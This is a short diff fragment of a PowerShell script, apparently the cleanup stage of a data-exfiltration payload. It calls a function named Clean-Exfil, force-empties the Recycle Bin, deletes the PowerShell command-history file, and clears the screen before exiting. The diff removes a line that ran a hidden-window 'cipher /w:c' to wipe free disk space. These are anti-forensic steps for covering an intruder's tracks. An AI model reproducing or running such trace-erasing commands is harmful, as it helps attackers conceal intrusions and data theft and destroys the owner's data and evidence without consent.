@@ -89,7 +89,7 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 }
 Clean-Exfil
-start powershell -argumentlist '-windowstyle hidden cipher /w:c'
+
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 cls
 exit
